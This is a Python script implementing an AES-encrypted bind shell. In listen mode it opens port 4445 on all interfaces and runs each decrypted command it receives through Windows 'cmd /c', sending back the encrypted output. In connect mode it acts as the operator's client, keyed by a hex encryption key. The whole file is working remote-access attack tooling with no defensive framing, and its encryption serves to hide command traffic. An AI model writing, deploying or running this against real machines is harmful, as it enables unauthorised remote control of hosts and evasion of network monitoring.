import socket, subprocess, threading, argparse, sys

# package required: pycryptodome
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

# CONFIGURATION
DEFAULT_PORT = 4445
MAX_BUFFER = 4096

class AESCipher:
    def __init__(self, key=None):
        self.key = key if key else get_random_bytes(32)
        self.cipher = AES.new(self.key, AES.MODE_ECB)

    def encrypt(self, plaintext):
    
        return self.cipher.encrypt(pad(plaintext, AES.block_size)).hex()

    def decrypt(self, encrypted_hex):
        try:
            encrypted_bytes = bytearray.fromhex(encrypted_hex)
            decrypted = self.cipher.decrypt(encrypted_bytes)
            return unpad(decrypted, AES.block_size)
        except (ValueError, KeyError):
            return b"Decryption Failed"

    def __str__(self):
        return "Key -> {}".format(self.key.hex())

#global cipher variable
cipher = None

def encrypted_send(s, msg):
    
    try:
        if isinstance(msg, str):
            msg = msg.encode("latin-1")
        
        # Encrypt prior to sending
        encrypted_data = cipher.encrypt(msg)
        s.send(encrypted_data.encode("latin-1"))
    except Exception as e:
        print(f"Send Error: {e}")


def execute_cmd(cmd):
    try:
        output = subprocess.check_output("cmd /c {}".format(cmd), stderr=subprocess.STDOUT)
    except:
        output = b"Command failed!"
    return output

def decode_and_strip(s):
    return s.decode("latin-1").strip()

def shell_thread(s):
    
    encrypted_send(s, b"[ -- Connection Successful! --]")
    try:
        while True:
            encrypted_send(s, b"\r\nEnter Command> ")
            
            data = s.recv(MAX_BUFFER)
            if data:
                # Decrypt incoming command
                decrypted_bytes = cipher.decrypt(decode_and_strip(data))
                
                if decrypted_bytes == b"Decryption Failed":
                    encrypted_send(s, b"Error: Decryption Failed.\n")
                    continue

                buffer = decode_and_strip(decrypted_bytes)

                if not buffer or buffer == "exit":
                    s.close()
                    break 
                
                print("> Executing command: '{}'".format(buffer))
                

                encrypted_send(s, execute_cmd(buffer))         
            else:
                break
    except Exception as e:
        print(f"Shell Error: {e}")
        s.close()
        exit() 

def send_thread(s):
    try:
        while True: 
            data = input() + "\n"
            encrypted_send(s, data.encode("latin-1"))
    except:
        s.close()
        exit()

def recv_thread(s):
    try:
        while True:
            data = decode_and_strip(s.recv(MAX_BUFFER))
            if data:
                decrypted = cipher.decrypt(data)
                print(decrypted.decode("latin-1"), end="", flush=True)
    except:
        s.close()
        exit()

def server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", DEFAULT_PORT))
    s.listen()

    print(f"[ -- Starting bind shell on Port {DEFAULT_PORT} -- ]")
    print(f"[ -- ENCRYPTION KEY: {cipher.key.hex()} -- ]")
    print("[ -- Connect with the client! -- ]")
    
    while True:
        client_socket, addr = s.accept()
        print(" [ -- New user connection successful! -- ]")
        threading.Thread(target=shell_thread, args=(client_socket,)).start()

def client(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, DEFAULT_PORT))

    print(" [ -- Connecting to bind shell -- ]")
    threading.Thread(target=send_thread, args=(s,)).start()
    threading.Thread(target=recv_thread, args=(s,)).start()


parser = argparse.ArgumentParser()
parser.add_argument("-l", "--listen", action="store_true", help="Setup a bind shell", required=False)
parser.add_argument("-c", "--connect", help="Connect to a bind shell", required=False)
parser.add_argument("-k", "--key", help="Encryption key (Hex)", type=str, required=False)
args = parser.parse_args()

# Key Management
if args.connect and not args.key:
    parser.error("-c CONNECT requires -k KEY!")

if args.key:
    cipher = AESCipher(bytearray.fromhex(args.key))
else:
    # Generate the new key when in server mode
    cipher = AESCipher()

if args.listen:
    server()
elif args.connect:
    client(args.connect)